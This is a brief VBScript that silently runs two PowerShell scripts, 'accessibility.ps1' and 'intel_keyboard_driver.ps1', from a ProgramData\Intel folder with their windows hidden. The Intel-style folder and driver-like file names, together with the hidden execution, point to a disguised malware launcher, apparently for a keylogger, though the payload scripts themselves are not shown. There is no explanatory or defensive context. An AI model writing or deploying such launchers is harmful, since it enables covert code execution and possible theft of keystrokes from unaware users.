Set WshShell = CreateObject("Wscript.Shell")

WshShell.Run "powershell.exe -File ""C:\ProgramData\Intel\accessibility.ps1"" -WindowStyle Hidden", 0 

WshShell.Run "powershell.exe -File ""C:\ProgramData\Intel\intel_keyboard_driver.ps1"" -WindowStyle Hidden", 0
